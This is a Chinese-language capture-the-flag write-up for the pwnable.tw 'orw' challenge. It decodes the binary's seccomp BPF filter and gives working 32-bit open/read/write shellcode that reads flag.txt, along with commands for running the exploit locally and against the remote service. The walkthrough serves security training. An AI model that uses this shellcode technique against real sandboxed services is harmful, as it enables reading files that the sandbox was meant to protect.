# Speedrun：pwnable.tw `orw`（seccomp 沙箱 + ORW shellcode）

> 题型：**程序自带 seccomp BPF + 直接执行输入缓冲区 → 只能 open/read/write 读文件**
> 亮点：保护项（canary/RELRO）全都无关，真正的门槛是"看懂那 12 条 BPF"；
> 另一坑是现代内核把 `.bss` 设为 RW，本地跑会 SIGSEGV，需要给 PT_LOAD 补 `PF_X`
> 出处：pwnable.tw 10000 `orw`

---

## 0. 一句话结论

```text
32 位、No PIE、GNU_STACK=RWE、有 canary、partial RELRO

main:
  orw_seccomp()                          # prctl(PR_SET_NO_NEW_PRIVS) + prctl(PR_SET_SECCOMP, FILTER)
  printf("Give my your shellcode:")
  read(0, 0x804a060, 0xc8)               # 最多 200 字节 shellcode 读到 .bss
  call 0x804a060                         # 直接执行

BPF（12 条，.rodata 0x8048640）实测放行：
  173 rt_sigreturn / 119 sigreturn / 252 exit_group / 1 exit
  5 open / 3 read / 4 write
  其它 -> 0x50026（SECCOMP_RET_ERRNO, ENOSYS）

=> 写 51 字节 ORW shellcode：open("flag.txt") -> read -> write(1,...)
```

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn Writeups/sandbox_seccomp'
file orw
readelf -hW orw | grep Type        # EXEC -> No PIE
readelf -lW orw | grep -E 'LOAD|STACK'
objdump -d -M intel orw | sed -n '/<orw_seccomp>:/,/^$/p'
objdump -s -j .rodata orw | sed -n '1,12p'   # 看到 0x8048640 起的 BPF 数组
```

`orw_seccomp` 的关键三行：

```asm
rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]   ; 把 0x18 个 dword（12 条 BPF）拷到栈
push 0x0; push 0x0; push 0x0; push 0x1; push 0x26
call prctl                                        ; PR_SET_NO_NEW_PRIVS
push &prog; push 0x2; push 0x16
call prctl                                        ; PR_SET_SECCOMP, SECCOMP_MODE_FILTER
```

---

## 2. 解析 BPF（不用 seccomp-tools 也能做）

`struct sock_filter { uint16 code; uint8 jt; uint8 jf; uint32 k; }`，12 条 × 8 字节：

```text
 0: ld  [4]            arch
 1: jeq 0x40000003     jt=0  jf=9     ; 非 i386 -> 直接跳 11（ALLOW）
 2: ld  [0]            nr
 3: jeq 173            jt=7            ; rt_sigreturn -> 11 ALLOW
 4: jeq 119            jt=6            ; sigreturn     -> 11 ALLOW
 5: jeq 252            jt=5            ; exit_group    -> 11 ALLOW
 6: jeq 1              jt=4            ; exit          -> 11 ALLOW
 7: jeq 5              jt=3            ; open          -> 11 ALLOW
 8: jeq 3              jt=2            ; read          -> 11 ALLOW
 9: jeq 4              jt=1            ; write         -> 11 ALLOW
10: ret 0x50026                       ; ENOSYS
11: ret 0x7fff0000                    ; ALLOW
```

一次 `struct.unpack('<HBBI', ...)` 就能全部打出来（见 `README.md` §1 的脚本）。

---

## 3. shellcode（51 字节）

```asm
xor eax, eax
push eax                    ; 字符串结尾 \0
push 0x7478742e             ; "txt."
push 0x67616c66             ; "flag"      -> 栈上 "flag.txt"
mov ebx, esp
xor ecx, ecx                ; O_RDONLY
mov al, 5
int 0x80                    ; open("flag.txt", 0)

mov ebx, eax                ; fd
sub esp, 0x100              ; 缓冲区用栈（不要用 .bss 外未映射地址）
mov ecx, esp
xor eax, eax
mov al, 3
mov edx, 0x100
int 0x80                    ; read(fd, buf, 0x100)

xor eax, eax
xor ebx, ebx
inc ebx                     ; fd = 1
mov al, 4
int 0x80                    ; write(1, buf, 0x100)
```

实测输出：

```text
[*] shellcode: 51 bytes (max 200)
__PWNED__{orw_local_ok}
```

### 3.1 复跑方法（2026-11-23 审计补）

```bash
cd '/home/yfhd5/Pwn Writeups/sandbox_seccomp'
python make_local_exec.py          # 一次性：生成 RWE 补丁版 orw_local_exec（已生成可跳过）

# 本地（不带参数，自动优先用 ./orw_local_exec）
I386_LD=/tmp/libc32/root/usr/lib/i386-linux-gnu/ld-linux.so.2 \
I386_LIBPATH=/tmp/libc32/root/usr/lib/i386-linux-gnu \
python 23_pwnable_orw_exp.py

# 远程（pwnable.tw 原题）
python 23_pwnable_orw_exp.py REMOTE
```

- 默认值指向本机 `/tmp/libc32`（`libc6:i386` deb 解包，`libc.so.6` md5 `7fde74420b72b39b43abdce782ade03c`）。
  **换机器先确认路径**：`find /tmp -name ld-linux.so.2` —— `libc6:i386` 在
  `usr/lib/i386-linux-gnu/`，`libc6-i386` 在 `usr/lib32/`，两者不能混用。
- 本地要看到 flag，必须在**当前目录**放 `flag.txt`：shellcode 写死 `open("flag.txt")`。
- `orw` 是原版（给远程），`orw_local_exec` 只改了一个 `PT_LOAD` 的 `p_flags`；
  两个文件都要留在目录里，脚本按“存在即用”选择。
- 若报 `FileNotFoundError: './orw_local_exec'`，真实原因是**缺 32 位 loader**
  （ELF 的 interp 不存在），不是文件没生成；补 `I386_LD` 或装 `libc6-i386` 即可。

---

## 4. 坑点清单

1. **`.bss` 在现代内核不可执行**（最重要）。
   第二段 `PT_LOAD` 是 `RW`，`0x804a060` 落在这里；老内核 2.6.32 上 RW 段可执行，
   所以原题可解。本地跑会 SIGSEGV（我们实测 `exit=-11`，且 `write` 一个字节都出不来）。
   解决：`python make_local_exec.py` 把该 PT_LOAD 的 `p_flags` 改成 `RWE`，生成
   `orw_local_exec` 专门给本地用，原版 `orw` 保持不动。
2. **排查时别被 `io.close()` 骗**：`close()` 之后 `poll()` 恒为 `-9`（SIGKILL），
   看起来像"被 seccomp 杀了"，其实是我们自己杀的。
3. **不要用 `execve`**：被沙箱拦（`ENOSYS`）。
4. **缓冲区地址**：`0x804a060+0xc8` 之后就没有映射了，`read` 目标必须选在栈上或
   段内有效地址。
5. **32 位 syscall 号**：`open=5`、`read=3`、`write=4`；64 位是 `openat=257`、
   `read=0`、`write=1`，别混。

---

## 5. 识别卡

```text
程序里有 prctl(0x26)/prctl(0x16) 两次调用
+ .rodata 一段 8 字节一组的数组，末尾有 0x7fff0000
=> seccomp 沙箱：先 dump BPF，再决定 ORW 还是能直接 getshell
```

| 关键量 | 值 |
| --- | --- |
| shellcode 落点 | `0x804a060` |
| 输入上限 | `0xc8`（200 字节） |
| BPF 数组 | `0x8048640`，12 条 |
| 允许的 syscall | 1 / 3 / 4 / 5 / 119 / 173 / 252 |
| 本地补丁 | `make_local_exec.py` → `orw_local_exec`（PT_LOAD `0x8049f08` 加 PF_X） |
